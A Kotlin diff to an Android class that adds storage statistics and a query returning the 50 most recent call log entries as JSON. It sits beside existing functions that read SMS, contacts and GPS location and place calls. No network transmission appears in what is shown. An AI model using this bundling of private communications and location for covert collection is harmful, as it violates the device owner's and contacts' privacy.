@@ -8,11 +8,15 @@ import android.location.LocationListener
 import android.location.LocationManager
 import android.net.Uri
 import android.os.Bundle
+import android.os.Environment
+import android.os.StatFs
+import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.telephony.SmsManager
 import org.json.JSONArray
 import org.json.JSONObject
+import java.util.Locale
 
 class TelephonyAndLocationManager(private val context: Context) {
 
@@ -46,6 +50,80 @@ class TelephonyAndLocationManager(private val context: Context) {
         }
     }
 
+    // --- 1. Real Storage Calculations ---
+    fun getStorageStats(): JSONObject {
+        val obj = JSONObject()
+        try {
+            val path = Environment.getDataDirectory()
+            val stat = StatFs(path.path)
+            val blockSize = stat.blockSizeLong
+            val totalBlocks = stat.blockCountLong
+            val availableBlocks = stat.availableBlocksLong
+
+            val totalBytes = totalBlocks * blockSize
+            val freeBytes = availableBlocks * blockSize
+            val usedBytes = totalBytes - freeBytes
+
+            val totalGB = totalBytes / (1024.0 * 1024.0 * 1024.0)
+            val usedGB = usedBytes / (1024.0 * 1024.0 * 1024.0)
+            val freeGB = freeBytes / (1024.0 * 1024.0 * 1024.0)
+            val usedPercent = if (totalBytes > 0) ((usedBytes.toDouble() / totalBytes.toDouble()) * 100).toInt() else 0
+
+            obj.put("totalGB", String.format(Locale.US, "%.1f GB", totalGB))
+            obj.put("usedGB", String.format(Locale.US, "%.1f GB", usedGB))
+            obj.put("freeGB", String.format(Locale.US, "%.1f GB", freeGB))
+            obj.put("usedPercent", usedPercent)
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        return obj
+    }
+
+    // --- 2. Call Logs Query ---
+    fun getCallLogs(): JSONArray {
+        val array = JSONArray()
+        try {
+            val cursor = context.contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                arrayOf(
+                    CallLog.Calls.NUMBER,
+                    CallLog.Calls.CACHED_NAME,
+                    CallLog.Calls.TYPE,
+                    CallLog.Calls.DATE,
+                    CallLog.Calls.DURATION
+                ),
+                null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
+            )
+            cursor?.use {
+                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
+                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
+                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
+                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
+
+                while (it.moveToNext()) {
+                    val typeInt = if (typeIdx >= 0) it.getInt(typeIdx) else CallLog.Calls.INCOMING_TYPE
+                    val typeStr = when (typeInt) {
+                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
+                        CallLog.Calls.MISSED_TYPE -> "Missed"
+                        else -> "Incoming"
+                    }
+
+                    val obj = JSONObject().apply {
+                        put("number", if (numIdx >= 0) it.getString(numIdx) else "")
+                        put("name", if (nameIdx >= 0 && it.getString(nameIdx) != null) it.getString(nameIdx) else "Unknown")
+                        put("type", typeStr)
+                        put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0L)
+                        put("duration", if (durIdx >= 0) "${it.getInt(durIdx)}s" else "0s")
+                    }
+                    array.put(obj)
+                }
+            }
+        } catch (e: Exception) { e.printStackTrace() }
+        return array
+    }
+
+    // --- 3. SMS Queries ---
     fun getRecentSms(): JSONArray {
         val array = JSONArray()
         try {
@@ -85,6 +163,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         }
     }
 
+    // --- 4. Contacts Query ---
     fun getContacts(): JSONArray {
         val array = JSONArray()
         try {
@@ -108,6 +187,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return array
     }
 
+    // --- 5. GPS Location ---
     @SuppressLint("MissingPermission")
     fun getLocation(): JSONObject {
         val obj = JSONObject()
@@ -131,6 +211,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return obj
     }
 
+    // --- 6. Make Phone Call ---
     @SuppressLint("MissingPermission")
     fun makeCall(number: String) {
         try {
